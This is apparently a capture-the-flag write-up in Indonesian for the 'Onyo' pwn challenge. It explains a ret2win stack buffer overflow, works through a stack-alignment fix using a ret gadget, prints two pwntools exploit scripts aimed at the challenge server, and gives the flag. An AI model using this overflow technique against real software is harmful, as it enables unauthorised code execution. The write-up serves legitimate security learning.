# Onyo - pwn


## Description

Hello frend!
Can you read flag.txt?

nc challs.ctf.cafe 8888

Author : Zerotistic

# Exploit

Diberikan sebuah ELF 64-bit, yang didalam hint sudah dijelaskan bahwa challenge kali ini bertipe **ret2win**, berikut rincian keamanannya dalam checksec

![](https://i.imgur.com/kgdKGqZ.png)

**PIE Disable & No Canary** sip, coba kita jalankan program tersebut

![](https://i.imgur.com/vGEmIGr.png)

Kita disuruh mengirimkan input, saat kita selesai mengirimkan input tersebut, program akan memberi tahu kita bahwa ada fungsi **tersembunyi** yang kalau dipanggil akan ada sesuatu yang **wah** akan terjadi, dan fungsi tersebut bernama **please_call_me**, hmm....

Langsung aja kita disassemble fungsi main untuk mengetahui jumlah buffer yang diperlukan untuk **ret2win** karena kita ngga dikasih source codenya

![](https://i.imgur.com/gjIvswK.png)

Dari **main<+18>:	lea    rax,[rbp-0x4]** kita tau kalo buffernya disini **0x4** atau kalo di decimal yaitu **4** byte. Kalo udah dapet buffer tinggal kita cari fungsi yang namanya **please_call_me**

![](https://i.imgur.com/xEJM7RJ.png)

Dapetlah addressnya kita, tinggal craft payload terus tes ke remote aja.

```python
from pwn import *
from sys import *

p = process("./chall")
elf = context.binary = ELF("./chall", checksec=False)

cmd = """
b * main+30
"""

if(argv[1] == "gdb"):
	gdb.attach(p, cmd)
elif(argv[1] == "remote"):
	p = remote("challs.ctf.cafe",8888)


payload = cyclic(12)
payload += p64(elf.sym.please_call_me)

p.sendline(payload)
p.interactive()
```

Loh loh bang, katanya buffernya **4** byte, kok malah jadi  **12**??? gimana sih....
Jadi disini buffer emang **4** byte tapi kita perlu **8** byte lagi buat ngisi **RBP/Base Pointer**nya

Jadi kurang lebih memory layoutnya seperti ini
![](https://i.imgur.com/ZIyzdYi.png)


Kalo masih bingung bisa cek tutorial [disini](https://youtu.be/Oyw_i8L3t8c)

Oke lanjut, karena payload udah kita bikin, langsung aja tes ke remote

![](https://i.imgur.com/bH1LDv2.png)

Lah kok gabisa dapet shell???? Terus gimana??? 
Jadi hal kayak gini disebabin oleh [stack alignment](https://stackoverflow.com/questions/64729055/what-does-aligning-the-stack-mean-in-assembly)

Challenge ini juga mirip sama challenge COMPFEST14 2022 **Smart Identifier**, writeup punya ku bisa dilihat [disini](/COMPFESTCTF2022/Binary%20Exploitation/Smart%20Identifier/README.md)

Untuk mengatasinya, kita cukup tambahin aja return address sebelum address **please_call_me** dipanggil, nyari address tersebut bisa pake **ROPgadget**
![](https://i.imgur.com/X0tvoo3.png)

Tinggal craft lagi payloadnya terus tes ke server dan dapet deh flagnya.

```python
from pwn import *
from sys import *

p = process("./chall")
elf = context.binary = ELF("./chall", checksec=False)

cmd = """
b * main+30
"""

if(argv[1] == "gdb"):
	gdb.attach(p, cmd)
elif(argv[1] == "remote"):
	p = remote("challs.ctf.cafe",8888)


payload = cyclic(12)
payload += p64(0x000000000040101a) # return address
payload += p64(elf.sym.please_call_me)

p.sendline(payload)
p.interactive()
```

![](https://i.imgur.com/BZWjuyD.png)

**Flag : RUSH{D1d_y0u_s33_TH4t_M0m}**







